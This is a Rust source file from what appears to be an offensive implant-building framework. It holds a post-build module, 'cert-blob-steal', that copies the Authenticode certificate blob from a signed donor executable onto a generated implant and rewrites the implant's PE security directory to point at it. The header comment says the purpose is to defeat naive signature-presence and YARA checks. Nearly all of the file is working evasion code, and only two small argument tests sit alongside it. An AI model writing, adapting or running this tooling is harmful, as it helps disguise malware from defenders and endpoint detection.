//! `PostBuildModule` that grafts a WIN_CERTIFICATE blob from a donor
//! signed PE onto the generated implant. Replaces the WASM
//! `plugin-examples/signers/cert-blob-steal`.
//!
//! Arg: `donor=<path>`.
//!
//! Honest scope: the grafted signature will NOT pass `WinVerifyTrust`
//! (donor's hash, not implant's). It defeats naïve "no signature"
//! string/YARA checks; it does not defeat real signature validation.

use anyhow::{anyhow, bail, Result};
use std::fs;

use crate::modules::post_build::parse_kv_args;
use crate::modules::{ArgSpec, PostBuildModule};

const SECURITY_DATA_DIR_INDEX: usize = 4;

pub struct CertBlobSteal;

impl PostBuildModule for CertBlobSteal {
    fn id(&self) -> &'static str {
        "cert-blob-steal"
    }

    fn description(&self) -> &'static str {
        "Graft donor PE's WIN_CERTIFICATE onto the implant (does not pass WinVerifyTrust)"
    }

    fn args(&self) -> Vec<ArgSpec> {
        vec![ArgSpec::new("donor", "path")
            .required()
            .described("Path to a signed PE whose WIN_CERTIFICATE blob will be grafted")]
    }

    fn apply(&self, args: &[String], implant: &mut Vec<u8>) -> Result<()> {
        let kv = parse_kv_args(args)?;
        let donor_path = kv
            .iter()
            .find(|(k, _)| k == "donor")
            .map(|(_, v)| v.as_str())
            .ok_or_else(|| anyhow!("cert-blob-steal: missing required arg 'donor=<path>'"))?;

        let donor = fs::read(donor_path)
            .map_err(|e| anyhow!("cert-blob-steal: read donor {donor_path}: {e}"))?;

        let blob = extract_security_blob(&donor)?;
        graft_security_blob(implant, &blob)?;
        Ok(())
    }
}

fn extract_security_blob(pe: &[u8]) -> Result<Vec<u8>> {
    let (sec_off, sec_size) = security_dir(pe)?;
    if sec_size == 0 || sec_off == 0 {
        bail!("cert-blob-steal: donor has no Authenticode signature");
    }
    let start = sec_off as usize;
    let end = start
        .checked_add(sec_size as usize)
        .ok_or_else(|| anyhow!("cert-blob-steal: donor security dir overflow"))?;
    if end > pe.len() {
        bail!(
            "cert-blob-steal: donor security dir [{start}..{end}) past EOF ({})",
            pe.len()
        );
    }
    Ok(pe[start..end].to_vec())
}

fn graft_security_blob(implant: &mut Vec<u8>, blob: &[u8]) -> Result<()> {
    while !implant.len().is_multiple_of(8) {
        implant.push(0);
    }
    let new_offset = implant.len() as u32;
    let new_size = blob.len() as u32;
    implant.extend_from_slice(blob);

    let opt_hdr_off = optional_header_offset(implant)?;
    let magic = read_u16(implant, opt_hdr_off)?;
    let data_dir_off = match magic {
        0x10b => opt_hdr_off + 96,
        0x20b => opt_hdr_off + 112,
        other => bail!(
            "cert-blob-steal: implant has unknown PE optional-header magic 0x{other:04x}"
        ),
    };
    let sec_dir_off = data_dir_off + SECURITY_DATA_DIR_INDEX * 8;
    if sec_dir_off + 8 > implant.len() {
        bail!("cert-blob-steal: implant data directory truncated");
    }
    write_u32(implant, sec_dir_off, new_offset);
    write_u32(implant, sec_dir_off + 4, new_size);
    Ok(())
}

fn optional_header_offset(pe: &[u8]) -> Result<usize> {
    if pe.len() < 0x40 || &pe[0..2] != b"MZ" {
        bail!("cert-blob-steal: not a PE (missing MZ)");
    }
    let e_lfanew = read_u32(pe, 0x3C)? as usize;
    if e_lfanew + 24 > pe.len() || &pe[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        bail!("cert-blob-steal: not a PE (missing PE\\0\\0 signature)");
    }
    Ok(e_lfanew + 24)
}

fn security_dir(pe: &[u8]) -> Result<(u32, u32)> {
    let opt_hdr_off = optional_header_offset(pe)?;
    let magic = read_u16(pe, opt_hdr_off)?;
    let data_dir_off = match magic {
        0x10b => opt_hdr_off + 96,
        0x20b => opt_hdr_off + 112,
        other => bail!(
            "cert-blob-steal: donor unknown PE optional-header magic 0x{other:04x}"
        ),
    };
    let sec_dir_off = data_dir_off + SECURITY_DATA_DIR_INDEX * 8;
    if sec_dir_off + 8 > pe.len() {
        bail!("cert-blob-steal: donor data directory truncated");
    }
    Ok((read_u32(pe, sec_dir_off)?, read_u32(pe, sec_dir_off + 4)?))
}

fn read_u16(b: &[u8], at: usize) -> Result<u16> {
    let slice = b
        .get(at..at + 2)
        .ok_or_else(|| anyhow!("u16 read past EOF at {at}"))?;
    Ok(u16::from_le_bytes([slice[0], slice[1]]))
}

fn read_u32(b: &[u8], at: usize) -> Result<u32> {
    let slice = b
        .get(at..at + 4)
        .ok_or_else(|| anyhow!("u32 read past EOF at {at}"))?;
    Ok(u32::from_le_bytes([slice[0], slice[1], slice[2], slice[3]]))
}

fn write_u32(b: &mut [u8], at: usize, value: u32) {
    b[at..at + 4].copy_from_slice(&value.to_le_bytes());
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn missing_donor_arg_errors() {
        let m = CertBlobSteal;
        let mut buf = Vec::new();
        let err = m.apply(&[], &mut buf).unwrap_err();
        assert!(err.to_string().contains("donor="));
    }

    #[test]
    fn malformed_arg_errors() {
        let m = CertBlobSteal;
        let mut buf = Vec::new();
        let err = m.apply(&["nope".into()], &mut buf).unwrap_err();
        assert!(err.to_string().contains("expected key=value"));
    }
}
